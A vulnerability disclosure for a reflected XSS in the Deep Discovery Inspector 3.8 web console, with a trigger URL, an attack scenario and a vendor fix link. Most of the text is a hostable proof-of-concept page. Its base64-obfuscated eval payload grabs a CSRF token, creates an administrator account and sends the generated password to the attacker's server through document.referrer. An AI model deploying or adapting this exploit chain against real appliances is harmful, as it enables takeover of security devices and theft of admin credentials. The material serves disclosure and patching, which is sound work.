Reflected XSS in Deep Discovery Inspector 3.8
====

I've found a reflected XSS vulnerability in the management web interface of Deep Discovery Inspector 3.8 Service Pack 5 Build: 3.85.1165
Vulnerable script path is /php/detection_detail_filter.php. This script is accessible only by an authenticated user, but this does not make vulnerabilty less serious, considering the attack scenario that follows below.

# The following POST request payload trigers javascript code execution:
https://PASTE_DDI_IP_HERE/php/detection_detail_filter.php?ips%5B%5D=217.69.139.245%3A80<img src=/ onerror=alert(1) /img>

Screen1.png confirms that ips[] parameter is vulnerable to html code injection.

# Impact:
This vulnerability can be used bypass CSRF protection, obtain CSRF token and successfulty conduct CSRF attack. Even complete takeover of the Deep Discovery Inspector aplliance may be accomplished using the following scenario:

    1. User logged into the DDI web interface is inticed to visit malicius web page. 
    2. Malicious script on this page is launched using the XSS vulnerabilty in /php/detection_detail_filter.php
    3. The script is getting CSRF token vip PUT request to /wsgi/csrf/get_token/
    4. And then it uses the token obtained from the response to the prevoius request to add an account with administrator privileges
    5. The password for the added account is obtained from response to the previous request.
    6. Password can be transfered to attackers host via http request

Screen2.png shows the attack in action.

To reporduce the attack, you may use the following piece of code(ddi_ip variable should be changed acording to your DDI appliance's IP):

    <b>DDI PoC</b>
    <script type="text/javascript">

    function post(path, params, method) {
        method = method || "post"; // Set method to post by default if not specified.

        // The rest of this code assumes you are not using a library.
        // It can be made less wordy if you use one.
        var form = document.createElement("form");
        form.setAttribute("method", 'POST');
        form.setAttribute("action", path);

        for(var key in params) {
            if(params.hasOwnProperty(key)) {
                var hiddenField = document.createElement("input");
                hiddenField.setAttribute("type", "hidden");
                hiddenField.setAttribute("name", key);
                hiddenField.setAttribute("value", params[key]);

                form.appendChild(hiddenField);
             }
        }

        document.body.appendChild(form);
        form.submit();
    }

    var ddi_ip = '192.168.91.66';

    post('https:///'+ddi_ip+'/php/detection_detail_filter.php', {'ips[]':'217.69.139.245:8<img src=/ onerror=;eval(atob(\'dmFyIG1pbWVUeXBlID0gImFwcGxpY2F0aW9uL2pzb24iOwp2YXIgdXJsID0gJ2h0dHBzOi8vJytsb2NhdGlvbi5ob3N0bmFtZSsnL3dzZ2kvY3NyZi9nZXR
    fdG9rZW4vJzsKcGF5bG9hZDEgPSAneyJhY3QiOiAiZ2V0In0nO3ZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgCgl7IGlmICh4aHIucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSAKCQl7IHZhciBqc29uUmVzcG9uc2UgPSBK
    U09OLnBhcnNlKHhoci5yZXNwb25zZVRleHQpOwoJCSAgdmFyIHBheWxvYWQyID0geyJjc3JmIjogIiIgKyBqc29uUmVzcG9uc2UuY3NyZiArICIiICwgInVzZXJfbmFtZSI6ICJ0ZXN0YWRtMiIsInR5cGUiOiAwLCAiZW5hYmxlZCI6MSwgInJlc29sdl9kZXRlY3Rpb24iOjAgfTsKCQkgIHZhciB1cmwyPSdodHRwc
    zovLycrbG9jYXRpb24uaG9zdG5hbWUrJy93c2dpL3VzZXJfbWFuYWdlL2FkZF91c2VyJzsgCgkJICB4aHIub3BlbignUE9TVCcsIHVybDIsIGZhbHNlKTsKCQkgIHhoci5zZXRSZXF1ZXN0SGVhZGVyKCdDb250ZW50LVR5cGUnLCBtaW1lVHlwZSk7CgkJICB4aHIub25yZWFkeXN0YXRlY2hhbmdlID0gZnVuY3Rpb2
    4oKSB7CgkJICAJICAgIGlmICh4aHIucmVhZHlTdGF0ZSA9PSBYTUxIdHRwUmVxdWVzdC5ET05FKSB7CgkJCSAgCQl2YXIganNvblJlc3BvbnNlID0gSlNPTi5wYXJzZSh4aHIucmVzcG9uc2VUZXh0KTsKCQkJICAJCXZhciBsZWFrX3VybCA9IGRvY3VtZW50LnJlZmVycmVyKyc/Jytqc29uUmVzcG9uc2UuZGF0YTs
    KCQkJICAJCXZhciB4bWxIdHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CgkJCQkgICAgeG1sSHR0cC5vcGVuKCAiR0VUIiwgbGVha191cmwsIGZhbHNlICk7CgkJCQkgICAgeG1sSHR0cC5zZW5kKCBudWxsICk7CgkJICAJICAgIH0KCQkgIH0KCQkgIHhoci5zZW5kKEpTT04uc3RyaW5naWZ5KHBheWxvYWQyKSk7
    IH0gCgl9OyAgIAp4aHIub3BlbignUFVUJywgdXJsLCB0cnVlKTsKeGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtVHlwZScsIG1pbWVUeXBlKTsKeGhyLnNlbmQocGF5bG9hZDEpOw==\')) />'});

    </script>

This PoC code should be placed on attackers web server, and a link to this server should be opened by user(with admin permissions) logged in to DDI web interface. User may be enticed into clicking the link with the use of social engineering.


# Mitigation:
Trend Micro has provided the following solution:
https://success.trendmicro.com/solution/1121079
